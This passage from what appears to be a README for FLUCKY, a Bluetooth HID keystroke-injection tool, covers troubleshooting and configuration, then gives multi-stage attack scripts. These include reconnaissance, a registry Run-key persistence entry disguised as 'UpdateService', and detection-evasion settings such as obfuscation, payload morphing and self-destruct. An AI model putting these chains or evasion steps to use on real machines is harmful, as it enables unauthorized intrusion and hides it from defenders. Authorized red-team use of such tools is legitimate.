**Issue: "Error: Script too long"**

*Cause:* Script exceeds 4096 character limit

*Fix:* Optimize script or use multiple button scripts

*Optimization Techniques:*
1. Remove unnecessary DELAY commands
2. Use shorter STRING content
3. Combine commands with semicolons: `WIN r; STRING cmd; ENTER`
4. Use LOLBAS instead of lengthy manual steps

**Issue: "Error: STRING requires text to type"**

*Cause:* Empty STRING command

*Fix:* Ensure STRING has content

```bash
# Bad:
STRING

# Good:
STRING Hello World
```

#### Hardware Issues

**Issue: Buttons not responding**

*Check:*
1. Run `ENABLE_BUTTON` to verify buttons are enabled
2. Check physical wiring (GPIO 0 and GPIO 2)
3. Verify INPUT_PULLUP configuration
4. Test with simple command: `STRING Test`

**Issue: LED not working**

*Check:*
1. Run `STEALTH_OFF` to ensure stealth mode is disabled
2. Verify GPIO 22 connection
3. Check LED polarity
4. Test with: `STEALTH_ON` then `STEALTH_OFF`

#### Performance Issues

**Issue: Commands executing too slowly**

*Optimization:*
1. Run `DEFAULTDELAY 0` to remove default delays
2. Run `JITTER_OFF` to disable random delays
3. Run `OBFUSCATE_OFF` to disable obfuscation
4. Run `ADV_OBFUSCATE_OFF` to disable advanced obfuscation

**Issue: Random freezes or crashes**

*Stability Measures:*
1. Reduce script complexity
2. Add strategic DELAY commands
3. Avoid memory-intensive operations
4. Ensure stable power supply

### Error Code Reference

| Error Message | Cause | Solution |
|--------------|-------|----------|
| `Bluetooth not initialized` | BLE not started | Use `RECONNECT` |
| `Bluetooth not connected` | No active connection | Check target device |
| `Invalid command length` | Command > 256 chars | Split into parts |
| `STRING requires text` | Empty string | Add content |
| `Unknown command` | Typo or invalid | Check `help` |
| `Script too long` | > 4096 characters | Optimize script |
| `Button script buffer overflow` | Script too large | Use smaller script |
| `XOR key required` | Encryption needed | Set key first |

---

## 🔧 Advanced Configuration Guide

### Memory Management

**Buffer Sizes and Limits:**

| Buffer | Size | Notes |
|--------|------|-------|
| Command buffer | 256 characters | Single command limit |
| Script storage | 4096 characters | Total script size |
| Command history | 10 entries | For REPEAT function |
| Gaslight profile | 50 lines max | Profile definition |
| Serial buffer | 1024 bytes | Communication buffer |

**Optimization Tips:**
1. Use shorter string literals
2. Reuse commands with `REPEAT`
3. Store complex scripts as button scripts
4. Use LOLBAS instead of long manual sequences

### Power Management

**Battery Operation:**

```bash
# Extend battery life
STEALTH_ON        # Disable LED
DISABLE_BUTTON    # Prevent accidental activation
DELAY 1000        # Add delays to reduce duty cycle
```

**Typical Consumption:**
- Active transmission: ~80mA
- Idle advertising: ~40mA
- Stealth mode: ~35mA

**USB Power Considerations:**
- Use quality USB cables
- Avoid USB hubs if possible
- Test with different power sources
- Monitor for voltage drops during transmission

---

## 🎯 Advanced Usage Patterns

### Multi-Stage Attack Chains

**Phase-Based Execution:**

```bash
# Stage 1: Reconnaissance
BUTTON_DEF
DELAY 3000
LOLBAS_CMD "systeminfo && whoami /all"
ENTER
DELAY 2000
STRING Phase 1 Complete - Reconnaissance
ENTER
END_BUTTON

# Stage 2: Privilege Escalation
BUTTON2_DEF
DELAY 3000
LOLBAS_REG query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
ENTER
DELAY 2000
STRING Phase 2 Complete - Privilege Assessment
ENTER
END_BUTTON2

# Stage 3: Persistence (Easter Egg)
HIDE_EGG "STRING Phase 3: Establishing Persistence; ENTER; DELAY 1000; LOLBAS_REG add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"UpdateService\" /t REG_SZ /d \"C:\\Windows\\System32\\notepad.exe\"; ENTER"
```

### Conditional Execution Patterns

**Time-Based Activation:**

```bash
# Execute different scripts based on time
SCHEDULE 30000 "STRING Morning Reconnaissance; ENTER"
SCHEDULE 720000 "STRING Afternoon Check; ENTER"
SCHEDULE 1440000 "STRING Evening Cleanup; ENTER"
```

**Behavior-Adaptive Scripts:**

```bash
# Use chaos mode for unpredictable execution
CHAOS_ON
BUTTON_DEF
STRING Unpredictable Security Test
ENTER
# Different execution each time based on random timing
END_BUTTON
```

---

## 🔒 Security Best Practices

### Operational Security

**Pre-Deployment Checklist:**

1. Run `SET_XOR_KEY MissionSpecificKey`
2. Run `STEALTH_ON`
3. Run `DISABLE_BUTTON` for transport
4. Verify all scripts encrypted
5. Test in isolated environment first

**Post-Operation Procedures:**

1. Run `ACTIVATE_EGG` if cleanup script defined
2. Run `MORPH_PAYLOAD` to change script signatures
3. Run `SET_XOR_KEY NewKey` to change encryption
4. Run `SELF_DESTRUCT 1` for one-time use

### Detection Avoidance

**Behavioral Evasion:**

```bash
# Make execution look human
ADV_OBFUSCATE_ON
SET_JITTER 500
JITTER_ON
DEFAULTDELAY 100
# Adds randomness to timing and keystrokes
```

**Signature Evasion:**

```bash
# Change command signatures
MORPH_PAYLOAD  # Randomize script order
SET_XOR_KEY    # Encrypt stored scripts
# Use LOLBAS to avoid external tool signatures
```

---

## 🤝 Community & Contribution

### How to Contribute

**Feature Requests:**
- Submit detailed use cases
- Explain the operational need
- Suggest implementation approach

**Bug Reports:**
- Describe the exact issue
- Provide reproduction steps
- Include hardware/software environment

**Code Contributions:**
- Follow existing code style
- Add comprehensive comments
- Test thoroughly before submitting

### Success Stories Wanted!

Share Your FLUCKY Experiences:
- Real-world red team successes
- Creative use cases
- Custom modifications
- Training scenario ideas

---

## 📚 Learning Resources

### Next Steps After Mastering Basics

1. **Study LOLBAS Techniques** - Master living-off-the-land
2. **Learn Behavioral Analysis** - Understand detection mechanisms
3. **Practice OPSEC** - Operational security in real environments
4. **Explore Bluetooth Security** - Understand the underlying technology

### Related Tools to Explore

| Tool | Purpose |
|------|---------|
| WiFi Duck | WiFi-based HID tool |
| P4wnP1 | Advanced USB attack platform |
| Flipper Zero | Multi-tool for RF and physical security |

---

## 🎊 Final Words

### The FLUCKY Philosophy

FLUCKY represents a shift in HID security research tools - from simple script execution to sophisticated operational platforms. It's not just about what commands you can run, but:

> **🎯 Adaptation** - Morphing payloads and unpredictable timing
> **🔗 Integration** - Using built-in system tools
> **🧠 Psychology** - Testing human factors, not just technical controls
> **🕶️ Stealth** - Multiple layers of operational security

### Your Journey Ahead

You now have one of the most advanced Bluetooth HID tools available. But remember:

> **"The tool is only as effective as the operator's ethics."**

Continue learning, practicing, and thinking creatively about how to apply these capabilities in your security work. Always maintain the highest ethical standards, obtain proper authorization, and contribute positively to the security community.

---

<div align="center">

### 🦆 FLUCKY - Advanced Bluetooth HID Security Research Platform

**Built for Education • Designed for Awareness • Limited for Responsibility**

<img src="https://img.shields.io/badge/Made%20with-ESP32-orange?style=flat-square&logo=espressif" alt="Made with ESP32">
<img src="https://img.shields.io/badge/Purpose-Ethical%20Research-blue?style=flat-square" alt="Ethical Research">
<img src="https://img.shields.io/badge/Community-Security%20Professionals-green?style=flat-square" alt="Security Community">

---

**⭐ If FLUCKY has helped your security research, give it a star!**

**🐛 Found an issue? Have an ethical feature request? Contribute!**

**🚀 The journey of responsible security research continues here.**

---

*"In the hands of an ethical researcher, FLUCKY is a force for good in cybersecurity."*

</div>
